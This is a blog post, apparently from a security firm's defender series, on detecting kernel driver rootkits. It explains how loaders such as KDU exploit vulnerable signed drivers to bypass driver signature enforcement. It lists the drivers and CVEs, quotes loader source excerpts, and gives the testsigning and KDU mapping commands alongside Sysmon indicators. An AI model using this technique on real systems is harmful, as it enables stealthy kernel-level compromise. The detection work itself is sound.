      <guid>//localhost:1313/articles/2020/04/2020-04-20-a-defenders-guide-for-rootkit-detection-episode-1-kernel-drivers/</guid>
      <description>
        
        
        &lt;p&gt;&lt;em&gt;Author: Thom (&lt;/em&gt;&lt;a href=&#34;https://twitter.com/rootkid8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;@rootkid8&lt;/em&gt;&lt;/a&gt;&lt;em&gt;), Sysmon Mastery Help from Rana (&lt;a href=&#34;https://twitter.com/sec_coffee&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@sec_coffee&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Even before my birth, rootkits have been one of the most sophisticated and successful ways of obtaining persistence on a machine, and now in 2020 there are ever more trivial ways of escalating from system to kernel. Recently JUMPSEC’s youngest red team researcher &lt;a href=&#34;https://twitter.com/_batsec_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@_batsec_&lt;/a&gt; &lt;a href=&#34;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;raised the bar once more using rootkit techniques to universally evade Sysmon&lt;/a&gt;. This method of defeating Event Tracing for Windows is an incredible feat and the world of Windows logging is left shaken. As a result, we’re going to go down the rabbit hole of kernel driver rootkits, specifically looking at the use of vulnerable kernel drivers to escalate to ring-zero. First we need to start with some basics, how the Windows kernel implements defence-in-depth, how to bypass these restrictions, and how network defenders and system administrators can detect these techniques as “trivially” as attackers can implement them (skip to the end for a Sysmon Config). &lt;/p&gt;
&lt;h2&gt;Some OS Basics&lt;span class=&#34;absolute -mt-20&#34; id=&#34;some-os-basics&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#some-os-basics&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;For those of us who don&amp;rsquo;t know, operating systems and common CPU&amp;rsquo;s define hierarchical protection domains to implement defense in depth. Code executing on the CPU is run in one of these rings using CPU modes - with ring 3 being user-land and ring 0 being kernel-land. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2020-04-16-090738_677x477_scrot.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Only certain applications that require access to low level devices and hardware should be allowed access to run code in rings 2, 1 and 0, which is enforced at a microcode level on the CPU as well as by the operating system. In theory this privilege domain is sound, and its introduction expelled the days of causing total system crashes with one line of buggy code in user-land. However, the implementation of these rings at the operating system level, and worse-so at the driver level is reasonably vague and undocumented, opening up an entire space for kernel driver exploits as post exploitation privilege escalation and persistence mechanisms. &lt;/p&gt;
&lt;h2&gt;Writing a Kernel Mode Driver&lt;span class=&#34;absolute -mt-20&#34; id=&#34;writing-a-kernel-mode-driver&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#writing-a-kernel-mode-driver&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We’re going to look more closely at how Windows handles device drivers, since these drivers allow access to kernel space, we will hopefully uncover some of the ways to get arbitrary code to run in kernel mode without the use of a signed driver. Heck, &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;writing a kernel mode driver isn’t a particularly challenging task&lt;/a&gt;, but if you want it to run on a target system it will require setting up “Test Mode” on the operating system or completely disabling device driver signing enforcement (DSE) globally which requires access to the boot settings, or through running the following command followed by a reboot:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;bcdedit /set testsigning on&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Both of these techniques are about as stealthy as using a sledgehammer to hide the noise of your power drill, and not only will most ordinary users recognise the &lt;strong&gt;Test Mode&lt;/strong&gt; warning on their device, many organisations restrict this functionality group wide, &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;and if they don’t then they really should.&lt;/a&gt; There is of course a way to hide the watermarks and warnings, but again this is a sledgehammer approach since bcdedit will be caught by a blue team with any real level of sophistication.&lt;/p&gt;
&lt;p&gt;Instead, we need to bypass Driver Signature Enforcement and PatchGuard, both of which being Windows kernel protection mechanisms. One to prevent unsigned drivers being loaded and another to prevent drivers from modifying critical kernel data structures through integrity checks. Again, any blue team should be able to detect the loading of a driver with an expired certificate - &lt;a href=&#34;https://github.com/SwiftOnSecurity/sysmon-config&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SwiftOnSecurity’s handy Sysmon config will anyway!&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;The Story of One Kernel Driver Loader&amp;hellip;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-story-of-one-kernel-driver-loader&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-story-of-one-kernel-driver-loader&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to explore these kernel mode drivers, we need to take a trip back in time. There used to be (and still are) some fantastic base projects for kernel mode drivers like the ones we’re investigating. Written by a legend in this space &lt;a href=&#34;https://twitter.com/hfiref0x?lang=en&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@hfiref0x&lt;/a&gt; - we’ll start with &lt;a href=&#34;https://github.com/hfiref0x/TDL&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;TDL or Turla Driver Loader&lt;/a&gt;. Around 4 years ago, this tool was a rootkit developer&amp;rsquo;s wet dream. It’s the supercedent to &lt;a href=&#34;https://github.com/hfiref0x/DSEFix&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DSEFix&lt;/a&gt;, another driver loader written by hfiref0x, that became obsolete due to its modification of kernel variables that got blocked by PatchGuard rendering it a guaranteed blue screen generator - a fun prank but not what we’re looking for. &lt;/p&gt;
&lt;p&gt;TDL acts as a fully functional driver loader that can be used independently of the Windows loader. As a byproduct it defeats 64-bit driver signature enforcement as well. The magic of Turla is the offensive technique it uses to get a custom driver to load into kernel memory. It comes packaged with a vulnerable version of a VirtualBox kernel mode driver, it loads and exploits this driver to overwrite kernel memory with a custom crafted driver before jumping to the DriverEntry function to begin execution. Effectively this can be visualised as so:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Rootkits.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This technique is somewhat akin to process hollowing, but instead of creating a suspended thread and mapping our code into it, we load a known driver and use shellcode to map our malicious code into that segment of memory.&lt;/p&gt;
&lt;p&gt;The technique is surprisingly simple, but extremely effective. Since the VirtualBox driver runs in kernel mode already, by dropping shellcode that now runs in kernel land we can execute an mmov, an mmap, and a jump (in reality it’s much more complex than that but just for simplicity’s sake we rely on those three instructions). This means that all the target kernel driver needs is permission to read and write physical memory, and have a code execution CVE for it to become a candidate for kernel driver loading.&lt;/p&gt;
&lt;p&gt;Clearly hfiref0x doesn’t sleep, and soon after TDL, &lt;a href=&#34;https://github.com/hfiref0x/Stryker&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Stryker&lt;/a&gt; was released, yet another kernel driver loader. This time the loader was crafted to &lt;a href=&#34;https://www.cpuid.com/softwares/cpu-z.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;exploit a CPU-Z driver&lt;/a&gt; instead, functioning very similarly to its predecessor. Now again in 2020,  hfiref0x strikes again with the release of Kernel Driver Utility (&lt;a href=&#34;https://github.com/hfiref0x/KDU&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;KDU&lt;/a&gt;) just 2 months ago, the same concept is being used, except now KDU supports multiple vulnerable drivers as “functionality providers&amp;rsquo;&amp;rsquo;. Hilariously named, these functionality providers are the keys to the kingdom, and if we have any hopes of detecting rootkits that use this technique we need to understand how KDU loads these drivers, how it exploits them, and what breadcrumbs we can search for on systems to check for compromise.&lt;/p&gt;
&lt;p&gt;Looking briefly at the Github attributes we can see there are 4 CVE’s associated with the project:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2291&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2015-2291&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2019-18845&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- IQVW32.sys intel ethernet driver vulnerability&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18845&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2019-18845&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2018-19320&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- MsIo64.sys and MsIo32.sys Patriot Viper vulnerability&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-19320&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2018-19320&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2019-16098&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- GDrv graphics driver vulnerability &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16098&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2019-16098&lt;/a&gt; - RTCore64.sys and RTCore32.sys vulnerability&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With more providers mentioned in the README:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ATSZIO64 driver from ASUSTeK WinFlash utility of various versions;&lt;/li&gt;
&lt;li&gt;GLCKIO2 (WinIo) driver from ASRock Polychrome RGB of version 1.0.4;&lt;/li&gt;
&lt;li&gt;EneIo (WinIo) driver from G.SKILL Trident Z Lighting Control of version 1.00.08;&lt;/li&gt;
&lt;li&gt;WinRing0x64 driver from EVGA Precision X1 of version 1.0.2.0;&lt;/li&gt;
&lt;li&gt;EneTechIo (WinIo) driver from Thermaltake TOUGHRAM software of version 1.0.3.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The most notable thing regarding these vulnerabilities is that they all expose ring-zero code execution capabilities, enabling the entire kill-chain of KDU. Even more interestingly  CVE-2019-16098 even states in the description: &lt;strong&gt;&lt;em&gt;These signed drivers can also be used to bypass the Microsoft driver-signing policy to deploy malicious code.&lt;/em&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;As a disclaimer, we can note that hfiref0x states KDU and all similar tools are not actually hacking tools, they are for driver developers to make their lives easier. &lt;strong&gt;A lazy AV will flag this tool as malware&lt;/strong&gt;, but also because in many senses of the word, KDU is malware in the same way a remote access tool for sysadmins can be malware.&lt;/p&gt;
&lt;h2&gt;Static Analysis &lt;span class=&#34;absolute -mt-20&#34; id=&#34;static-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#static-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;[WARNING: RABBIT HOLE AHEAD]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;If you’re not interested in KDU source code or boring operating system details then skip to Dynamic Analysis.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Examining the source code of KDU we see an abstraction layer that is implemented by the driver loader, each provider has the following structure:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;144 typedef struct _KDU_PROVIDER {                          
…………………………………………………
161     struct {
162         provRegisterDriver RegisterDriver; //optional
163         provUnregisterDriver UnregisterDriver; //optional
164
165         provAllocateKernelVM AllocateKernelVM; //optional
166         provFreeKernelVM FreeKernelVM; //optional
167
168         provReadKernelVM ReadKernelVM;
169         provWriteKernelVM WriteKernelVM;
170
171         provVirtualToPhysical VirtualToPhysical; //optional
172         provReadControlRegister ReadControlRegister; //optional
173     
174         provQueryPML4 QueryPML4Value; //optional
175         provReadPhysicalMemory ReadPhysicalMemory; //optional
176         provWritePhysicalMemory WritePhysicalMemory; //optional
177     } Callbacks;
178 } KDU_PROVIDER, * PKDU_PROVIDER;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;I’ve ignored the unimportant fields, but from here we can understand what it takes to construct a provider, and we can see there are function pointers required for:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;reading and writing virtual memory, &lt;/li&gt;
&lt;li&gt;mapping virtual addresses to physical addresses, &lt;/li&gt;
&lt;li&gt;reading and writing physical addresses &lt;/li&gt;
&lt;li&gt;reading two kernel registers - the PML4 and the Control Register&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It should be pretty clear so far why we need to be able to read and write physical and virtual memory addresses, but what are the PML4 and the control register and why does the exploit require them? Well if you’re familiar with Linux kernels then the PML4 is simply the base address to the multi-level page table that the kernel uses to map linear virtual address spaces to processes. In order to replace our driver in memory we need to be able to find where it’s stored in memory which requires reading from the page table to find the address space of the target driver. Hence we can read this base address from the PML4 register. &lt;/p&gt;
&lt;p&gt;The control register should also be familiar to kernel developers or assembly folks, but to those of you who don’t know - it’s a 64-bit register that has a few important use cases required by virtual memory mapping and paging. In cases where either no function is defined for mapping virtual memory to physical memory, and nothing for reading the PML4, KDU uses the control register value to find the page directory address. This allows it to translate virtual addresses to physical addresses so it can walk through the page table and overwrite physical kernel memory regions:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt; 39  BOOL PwVirtualToPhysical(
 40     _In_ HANDLE DeviceHandle,
 41     _In_ provQueryPML4 QueryPML4Routine,
 42     _In_ provReadPhysicalMemory ReadPhysicalMemoryRoutine,
 43     _In_ ULONG_PTR VirtualAddress,
 44     _Out_ ULONG_PTR* PhysicalAddress)
 45 {   
 46     ULONG_PTR   pml4_cr3, selector, table, entry = 0;
 47     INT         r, shift;
 48     
 49     *PhysicalAddress = 0;
 50     
 51     if (QueryPML4Routine(DeviceHandle, &amp;amp;pml4_cr3) == 0)
 52         return 0;
 53     
 54     table = pml4_cr3 &amp;amp; PHY_ADDRESS_MASK;
 55     
 56     for (r = 0; r &amp;lt; 4; r&amp;#43;&amp;#43;) {
 57         
 58         shift = 39 - (r * 9);
 59         selector = (VirtualAddress &amp;gt;&amp;gt; shift) &amp;amp; 0x1ff;
 60         
 61         if (ReadPhysicalMemoryRoutine(DeviceHandle,
 62             table &amp;#43; selector * 8,
 63             &amp;amp;entry,
 64             sizeof(ULONG_PTR)) == 0)
 65         {   
 66             return 0;
 67         }
 68         
 69         if (PwEntryToPhyAddr(entry, &amp;amp;table) == 0)
 70             return 0;
 71         
 72         if ((r == 2) &amp;amp;&amp;amp; ((entry &amp;amp; ENTRY_PAGE_SIZE_BIT) != 0)) {
 73             table &amp;amp;= PHY_ADDRESS_MASK_2MB_PAGES;
 74             table &amp;#43;= VirtualAddress &amp;amp; VADDR_ADDRESS_MASK_2MB_PAGES;
 75             *PhysicalAddress = table;
 76             return 1;
 77         }
 78     }
 79     
 80     table &amp;#43;= VirtualAddress &amp;amp; VADDR_ADDRESS_MASK_4KB_PAGES;
 81     *PhysicalAddress = table;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Digging deeper into the source code we actually discover that there are two drivers at play here: a victim driver and a vulnerable driver. Initially I presumed these to be the same driver, but the code appears to unpack, load and start the vulnerable driver first - this is the &lt;em&gt;provider&lt;/em&gt; - after which it calls KDUMapDriver which tries to load the victim driver.&lt;/p&gt;
&lt;p&gt;In the case of KDU, the victim driver is always the process explorer &lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys driver, it bootstraps shellcode into the IRP_MJ_DEVICE_CONTROL callback of PROCEXP152, before finally unloading it, triggering the shellcode to execute inside PROCEXP152, allowing the target driver to be loaded into kernel memory.&lt;/p&gt;
&lt;p&gt;Finally, let’s take a look at the core loader functionality, we want to understand the shellcode bootstrapping, and the system calls used to help us figure out what level of detection is possible. This snippet of code is where the bootstrapping happens inside KDUSetupShellCode:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;382         //
383         // Resolve import (ntoskrnl only) and write buffer to registry.
384         //
385         isz = FileHeader-&amp;gt;OptionalHeader.SizeOfImage;
386
387         DataBuffer = supHeapAlloc(isz);
388         if (DataBuffer) {
389             RtlCopyMemory(DataBuffer, Image, isz);
390
391             printf_s(&amp;#34;[&amp;#43;] Resolving kernel import for input driverrn&amp;#34;);
392             supResolveKernelImport((ULONG_PTR)DataBuffer, KernelImage, KernelBase);
393             
394             lResult = RegOpenKey(HKEY_LOCAL_MACHINE, NULL, &amp;amp;hKey);
395             if ((lResult == ERROR_SUCCESS) &amp;amp;&amp;amp; (hKey != NULL)) {
396
397                 lResult = RegSetKeyValue(hKey, NULL, TEXT(&amp;#34;~&amp;#34;), REG_BINARY,                                        
398                     DataBuffer, isz);
399
400                 bSuccess = (lResult == ERROR_SUCCESS);
401
402                 RegCloseKey(hKey);
403             }
404             supHeapFree(DataBuffer);
405         }
406     }&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;We see that first it finds the &lt;code&gt;**ntoskrnl**.exe&lt;/code&gt; base address - this is the starting address space of the kernel mapped memory region, containing important structures such as the page directory of mapped memory for all processes on the system. This is important because most process monitoring tools should be able to detect if this image is loaded. After this it calls &lt;code&gt;KDUStorePayload&lt;/code&gt; on the driver filename passed to it - interestingly this function writes a byte buffer that is just the raw bytes of the &lt;strong&gt;&lt;code&gt;rootkit.sys&lt;/code&gt;&lt;/strong&gt; &lt;em&gt;(or whatever input kernel mode driver you specify)&lt;/em&gt; to a registry hive in &lt;code&gt;HKLM&lt;/code&gt; with the key “~”:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2020-04-15-115900_749x165_scrot.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;[&lt;code&gt;4d5a&lt;/code&gt; is hex for &lt;code&gt;MZ&lt;/code&gt; also known as the magic bytes in the header of a PE image.]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;A fun part of this registry write is that KDU doesn’t clean up after itself so this artifact remains on the system as an IOC even after KDU’s removal. I’ve thrown together a little powershell script that you can find in the appendix for incident responders to check whether any PE data has been written to registry keys. It will detect KDU in it’s default state as well as any basic attempts at KDU modifications that change the target hive, and any other tools that write executable data to the registry.&lt;/p&gt;
&lt;p&gt;Furthermore, we come across this function call inside &lt;code&gt;VictimBuildName&lt;/code&gt; in &lt;code&gt;**victim**.cpp&lt;/code&gt; that writes the victim driver &lt;strong&gt;&lt;code&gt;.sys&lt;/code&gt;&lt;/strong&gt; in the &lt;code&gt;%TEMP%&lt;/code&gt; directory:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt; 61 LPWSTR VictimBuildName(
 62     _In_ LPWSTR VictimName
 63 )
 64 {
 65     LPWSTR FileName;
 66     SIZE_T Length = (1024 &amp;#43; _strlen(VictimName)) * sizeof(WCHAR);
 67
 68     FileName = (LPWSTR)supHeapAlloc(Length);
 69     if (FileName == NULL) {
 70         SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 71     }
 72     else {
 73
 74         DWORD cch = supExpandEnvironmentStrings(L&amp;#34;%temp%\&amp;#34;, FileName, MAX_PATH);
 75         if (cch == 0 || cch &amp;gt; MAX_PATH) {
 76             SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 77             supHeapFree(FileName);
 78             FileName = NULL;
 79         }
 80         else {
 81             _strcat(FileName, VictimName);
 82             _strcat(FileName, L&amp;#34;.sys&amp;#34;);
 83         }
 84     }
 85
 86     return FileName;
 87 }&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This is exciting, as file writes are also solid ways of detecting malicious activity, especially if the write operations are hardcoded into the executable and not generated on the fly or randomly.&lt;/p&gt;
&lt;h2&gt;Dynamic Analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;dynamic-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#dynamic-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now that we have some potential indicators of execution for KDU from the source code: registry writes, files writes and image loads, we’re going to write some tests to see how this works in practice. To test these providers, I compiled KDU from source, wrote a custom kernel mode driver that acts as a tiny example rootkit, and wrote a batch script to execute &lt;strong&gt;&lt;code&gt;kdu -map -prv &amp;lt;ID&amp;gt; rootkit.sys&lt;/code&gt;&lt;/strong&gt; repeatedly with each of the providers in sequence. In each case we analyse the changes made to the system, in this example we’ll be using Procmon, and Sysmon.&lt;/p&gt;
&lt;p&gt;The procmon test shows a pretty clear pattern of events demonstrated by the following diagram:&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/image-1024x409.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;Sysmon output&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Using our custom Sysmon config, we also see the following events traced by Sysmon: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create %TEMP%&lt;strong&gt;PROVIDER&lt;/strong&gt;.sys &lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROVIDER&lt;/strong&gt;Start registry value to 3 (Manual Start)&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROVIDER&lt;/strong&gt;ImagePath to %TEMP%&lt;strong&gt;PROVIDER&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;&lt;em&gt;DRIVER LOADED&lt;/em&gt;&lt;strong&gt;&lt;em&gt;: PROVIDER.sys&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Create %CD%&lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROCEXP152&lt;/strong&gt;Start registry value to 3 (Manual Start)&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROCEXP152&lt;/strong&gt;ImagePath to %CD%&lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;&lt;em&gt;DRIVER LOADED&lt;/em&gt;&lt;strong&gt;&lt;em&gt;: PROCEXP152.sys&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Unsigned Image loaded &lt;strong&gt;rootkit.sys&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This makes more sense if we understand that the registry values in &lt;strong&gt;HKLMSystemCurrentControlSetServices&lt;Driver&gt;&lt;/strong&gt; are set and unset when Windows services are loaded, and these actions aren’t actually performed by the KDU code directly. Instead these events can be read as:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Unpack vulnerable (provider) driver to &lt;code&gt;%CD%&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start it&lt;/li&gt;
&lt;li&gt;Write rootkit binary data to &lt;code&gt;HKLM~&lt;/code&gt; registry hive&lt;/li&gt;
&lt;li&gt;Unpack victim driver (&lt;code&gt;**PROCEXP152**.sys&lt;/code&gt;) to &lt;code&gt;%TEMP%&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start it&lt;/li&gt;
&lt;li&gt;Unsigned rootkit kernel driver loaded into kernel memory&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This is almost exactly the pattern evident from the source code, although we had to add an explicit rule to pick up the binary data in &lt;code&gt;HKLM~&lt;/code&gt;. What we can note here as well is that this entire process relies on the loading of a very particular version of a vulnerable driver - this means it’ll have a particular hash which we could also use as a signature, as well as the final event - an unsigned driver still gets loaded into memory is the biggest telltale sign of something suspicious happening.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now, &lt;a href=&#34;https://www.reddit.com/r/blueteamsec/comments/fychxz/detect_ghostinthelogs_when_executed_disables_all/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;obviously we could have just executed KDU right at the start of this and obtained the IOC’s instantly, but where’s the fun in that&lt;/a&gt;? Instead you should now understand one fairly general technique for elevating from system to kernel, the inner workings of kernel level driver loaders (and the many similar tools using this technique), as well as how we can detect them. &lt;/p&gt;
